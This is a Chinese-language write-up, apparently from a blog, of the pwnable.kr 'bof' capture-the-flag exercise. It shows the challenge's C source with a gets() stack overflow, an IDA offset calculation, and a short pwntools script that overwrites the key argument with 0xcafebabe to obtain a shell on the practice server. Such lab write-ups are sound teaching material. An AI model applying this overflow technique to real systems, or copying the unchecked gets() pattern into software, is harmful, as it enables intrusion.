---
title: bof
date: 2022-07-12 19:46:00
tags:
- pwn
categories:
- [刷题, pwnable刷题]
---

# 题目简介

一道简单的溢出题目



# 解题流程

## 源码分析

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖`key`为`0xcafebabe`然后获得flag。



## 静态分析

拖到32位ida，进入func函数，查看栈结构

![image-20220712190744409](bof(wp)/image-20220712190744409.png)

上图`arg_0`就是函数传进来的参数也就是`key`的位置，这样就可以计算`s`和`key`相差0x34个字节，再向后将`key`的位置覆盖为`0xcafebabe`就可以获得flag。



# EXP

```python
from pwn import *
io = remote('pwnable.kr', 9000)
value = 0xCAFeBABe
payload = b'a'*52 + p32(value)
io.sendline(payload)
io.interactive()
```

